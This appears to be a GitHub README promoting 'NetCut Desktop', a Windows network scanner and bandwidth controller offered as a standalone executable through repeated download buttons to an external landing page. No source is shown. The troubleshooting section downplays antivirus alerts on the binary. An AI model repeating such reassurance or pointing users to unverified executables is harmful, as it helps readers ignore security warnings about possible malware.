<div align="center">

<img src="assets/banner.svg" width="100%" alt="NetCut Desktop banner"/>

# netcut-desktop-controller 🛰️🔒

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*See your network the way your router sees it — clearly, calmly, and under your control.*

<p align="center">
  <a href="https://ViewWalrusJack.github.io/netcut-desktop-controller/">
    <img src="https://img.shields.io/badge/GET-NetCut_Desktop_2026-0891B2?style=for-the-badge&logo=windows&logoColor=white&labelColor=0E7490" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 📡 Overview

Every home and office network eventually hits the same wall: too many devices, not enough visibility. A smart TV eats bandwidth during a video call, an unfamiliar hostname shows up on the router admin page, or a shared workspace network suddenly feels sluggish with no obvious culprit. **netcut-desktop-controller** was born out of that recurring frustration — the idea that network administration shouldn't require a command line, a subscription, or a networking degree.

NetCut Desktop is a native Windows application built for one purpose: giving you a real-time, readable map of every device connected to your local network, along with the practical tools to manage how bandwidth is distributed across them. It began as a weekend utility for a small office that kept losing Wi-Fi priority to guest devices, and over successive rewrites it grew into a full desktop controller — respecting the fact that most people who need this tool are not network engineers, just people who want their internet to behave predictably.

This project exists for home users tired of guessing why streaming buffers, IT hobbyists who manage small office LANs without enterprise gear, and power users who simply like knowing what's happening on their own network. If you've ever opened a router's web interface and felt lost in acronyms, NetCut Desktop is the translation layer between raw network data and a decision you can actually make.

> [!NOTE]
> NetCut Desktop operates entirely on your local network segment. It does not send traffic data anywhere — everything renders locally, in real time, on your machine.

<p align="center">

<a href="https://ViewWalrusJack.github.io/netcut-desktop-controller/">
  <img src="https://img.shields.io/badge/GET-NetCut_Desktop_2026-0891B2?style=for-the-badge&logo=windows&logoColor=white&labelColor=0E7490" width="550" alt="Download"/>
</a>

</p>

---

## 🧭 What Sets the Controller Apart

- **Live Device Radar** — a continuously refreshing inventory of every connected device, resolved by hostname, vendor prefix, and IP/MAC pairing, so unfamiliar entries stand out immediately.

- **Bandwidth Steering** — assign relative priority to devices on your own network, so the connection that matters most (a video call, a backup job) doesn't get starved by background chatter.

- **Session Timeline** — a scrollable history of device arrivals and departures, useful for spotting patterns like "the smart plug reconnects every night at 2 AM."

- **One-Click Network Snapshot** — export the current topology as a shareable report, handy for troubleshooting with an ISP or comparing before/after states.

- **Vendor Fingerprinting** — MAC-prefix lookups that label devices by manufacturer, turning cryptic hex addresses into readable names like "Samsung," "Espressif," or "Apple."

- **Zero-Dependency Footprint** — a single standalone executable; no runtime installs, no background services competing for resources.

- **Dark & Light Rendering** — a rendering engine tuned for long monitoring sessions, so the interface stays easy on the eyes whether it's a bright office or a dim server closet.

- **Silent Tray Mode** — the controller can minimize to the system tray and keep monitoring quietly, surfacing a notification only when something on the network actually changes.

---

## 🚀 Getting Started

> [!TIP]
> The entire setup takes under two minutes on a typical Windows machine — there's no configuration wizard to fight through.

1. Visit the [project landing page](https://ViewWalrusJack.github.io/netcut-desktop-controller/) using the button above or below.

2. Download the latest **NetCut Desktop 2026** build for Windows.

3. Run the executable — no separate installer step, no bundled third-party runtimes.

4. Launch the app, allow it to scan your local network segment, and the device radar populates within seconds.

---

## 🖥️ Requirements Matrix

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **RAM** | 2 GB available | 4 GB available |
| **Disk** | 150 MB free space | 300 MB free space |

> [!IMPORTANT]
> NetCut Desktop is Windows-only by design in this release. There is no macOS or Linux build, and no dependency installation is required beyond the operating system itself.

---

## ⚙️ How It Works

The controller follows a deliberately simple pipeline — visibility first, action second:

1. **Discovery** — the app broadcasts a lightweight scan across the local subnet to enumerate active hosts.

2. **Resolution** — each responding host is matched against MAC vendor tables and reverse-DNS hints to produce a readable identity.

3. **Rendering** — the resolved device list populates the live dashboard, refreshed on a rolling interval.

4. **Control** — you assign bandwidth priority or flag devices of interest directly from the dashboard.

5. **Logging** — every join/leave event is written to the session timeline for later review.

```mermaid
flowchart LR

Scan --> Resolve

Resolve --> Dashboard

Dashboard --> Priority

Priority --> Timeline
```

---

## 🧩 Troubleshooting

<details>
<summary><strong>The device list stays empty after launch.</strong></summary>

<br>

Check that your Windows firewall isn't silently blocking the local scan. NetCut Desktop needs to send and receive discovery packets on your own subnet — it doesn't reach beyond your router.

</details>

<details>
<summary><strong>A device shows an IP but no vendor name.</strong></summary>

<br>

Some devices use randomized or locally-administered MAC addresses (common on modern phones for privacy). The vendor fingerprint will simply read "Unknown" in these cases — this is expected behavior, not a bug.

</details>

<details>
<summary><strong>Bandwidth priority changes don't seem to apply instantly.</strong></summary>

<br>

Priority adjustments take effect on the next network cycle, which can take a few seconds depending on device activity. Give it a short moment before assuming it hasn't worked.

</details>

<details>
<summary><strong>The app disappeared but I know it's still running.</strong></summary>

<br>

Check the system tray — Silent Tray Mode keeps the controller active in the background without an open window.

</details>

<details>
<summary><strong>My antivirus flagged the executable.</strong></summary>

<br>

Network-scanning tools frequently trigger heuristic warnings simply because they enumerate local hosts. Verify the download came from the official landing page linked in this README before proceeding.

</details>

> [!WARNING]
> Only use NetCut Desktop on networks you own or have explicit permission to manage. Monitoring or adjusting traffic priority on networks without authorization may violate local regulations or acceptable-use policies.

---

## 🎨 Interface & Experience

NetCut Desktop's UI was shaped around one principle: monitoring tools are often left open for hours, so they shouldn't fight for your attention.

| Shortcut | Action |
|---|---|
| `Ctrl + R` | Force an immediate network rescan |
| `Ctrl + D` | Toggle dark / light theme |
| `Ctrl + E` | Export current session snapshot |
| `Ctrl + M` | Minimize to system tray |
| `Ctrl + F` | Focus the device search bar |

- **Themes**: Dark (default for extended sessions) and Light (optimized for bright environments).

- **Settings**: Scan interval, notification sensitivity, and startup-with-Windows toggle are all adjustable from the Preferences panel.

- **Layout**: A resizable split view keeps the device radar and session timeline visible simultaneously.

![Tech](https://img.shields.io/badge/built%20with-C%2B%2B%20%2F%20WinUI-555?style=flat-square) ![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square) ![Stability](https://img.shields.io/badge/stability-stable-blue?style=flat-square)

---

## 🤝 Contributing & Community

Contributions, bug reports, and feature discussions are welcome. Whether you've found an edge case in vendor fingerprinting or want to propose a new dashboard widget, open an issue and describe the context clearly.

> [!TIP]
> When filing a bug report, include your Windows version and a description of your network setup (router model, approximate device count) — it dramatically speeds up diagnosis.

We aim to keep this project approachable for contributors who are new to networking tools as well as seasoned systems folks. Every perspective helps the roadmap stay grounded in real use cases.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026.

---

## ⚠️ Disclaimer

NetCut Desktop is provided as a network visibility and management utility for use on networks you own or are authorized to administer. The maintainers are not responsible for misuse of this tool on networks without proper authorization. Always comply with applicable laws and organizational policies when monitoring or managing network traffic.

<p align="center">

<a href="https://ViewWalrusJack.github.io/netcut-desktop-controller/">
  <img src="https://img.shields.io/badge/GET-NetCut_Desktop_2026-0891B2?style=for-the-badge&logo=windows&logoColor=white&labelColor=0E7490" width="550" alt="Download"/>
</a>

</p>